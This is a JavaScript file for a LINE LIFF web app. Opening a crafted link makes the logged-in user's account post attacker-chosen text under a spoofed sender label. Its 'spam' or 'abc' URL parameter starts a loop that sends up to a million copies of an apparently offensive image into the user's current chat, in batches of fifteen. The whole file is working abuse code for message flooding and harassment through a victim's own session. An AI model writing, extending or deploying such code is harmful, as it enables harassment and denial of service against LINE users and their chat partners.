const LIFF_ID = "2005745965-Vvy4WKpZ";

document.addEventListener("DOMContentLoaded", async () => {
    try {
        await liff.init({ liffId: LIFF_ID });
        if (liff.isInClient()) {
            await initializeLiff();
        }
    } catch (error) {
        console.error("LIFF Initialization failed", error);
    }
});

async function initializeLiff() {
    try {
        if (!liff.isLoggedIn()) {
            window.alert("LINE to login");
            liff.login();
        } else {
            await checkUrlParams();
        }
    } catch (error) {
        console.error("Error initializing LIFF", error);
    }
}

async function checkUrlParams() {
    const urlParams = new URLSearchParams(window.location.search);
    const textParam = urlParams.get("text");
    const spamParam = urlParams.get("spam") || urlParams.get("abc");

    if (textParam !== null) {
        await sendMessage({
            type: "text",
            text: textParam,
            sentBy: {
                label: "Nezumi-Project@2025",
                iconUrl: "https://raw.githubusercontent.com/nezumi0627/nezuminium.github.io/main/icon.gif",
                linkUrl: "https://nezumi0627.github.io/nezuminium.github.io/"
            }
        });
        liff.closeWindow();
    }

    if (spamParam !== null) {
        sendSpamMessages();
    }
}

async function sendSpamMessages() {
    const message = {
        type: "image",
        originalContentUrl:
            "https://ogami110.com/33namevoice/wp-content/uploads/2022/03/%E5%AF%9D%E5%8F%96%E3%82%89%E3%82%8C%E8%AA%BF%E6%95%99_7.jpg",
        previewImageUrl:
            "https://ogami110.com/33namevoice/wp-content/uploads/2022/03/%E5%AF%9D%E5%8F%96%E3%82%89%E3%82%8C%E8%AA%BF%E6%95%99_7.jpg"
    };

    const batchSize = 15;  // 一度に送信するメッセージ数
    const totalMessages = 1000000;  // 送信回数
    let sentCount = 0;

    for (let i = 0; i < totalMessages; i += batchSize) {
        try {
            const batch = Array(batchSize).fill(message);
            await liff.sendMessages(batch);
            sentCount += batchSize;
            if (sentCount % 100 === 0) {
                console.log(`Sent ${sentCount} messages`);
            }
        } catch (error) {
            console.error(`Error sending batch at count ${sentCount}:`, error);
        }
    }

    liff.closeWindow();
}

async function sendMessage(message) {
    try {
        await liff.sendMessages([message]);
    } catch (error) {
        console.error("Error sending message", error);
    }
}
